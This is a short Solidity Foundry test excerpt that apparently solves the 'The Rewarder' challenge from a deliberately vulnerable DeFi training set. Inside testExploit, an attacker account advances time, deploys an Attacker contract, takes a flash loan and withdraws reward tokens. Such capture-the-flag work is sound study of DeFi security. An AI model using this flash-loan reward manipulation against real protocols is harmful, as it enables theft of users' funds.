...
contract TheRewarder is Test {
    ...
    function testExploit() public {
         ...
         * EXPLOIT START *
         */
        // console2.log("DVT: ", dvt.totalSupply());
        // console2.log("DVT: ", dvt.decimals());
        vm.warp(block.timestamp + 5 days);
        vm.startPrank(attacker);
        Attacker attackerContract = new Attacker(
            address(theRewarderPool), address(dvt), address(flashLoanerPool), address(theRewarderPool.rewardToken())
        );
        attackerContract.doFlashLoan(TOKENS_IN_LENDER_POOL);
        attackerContract.withdrawRewardToken();
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
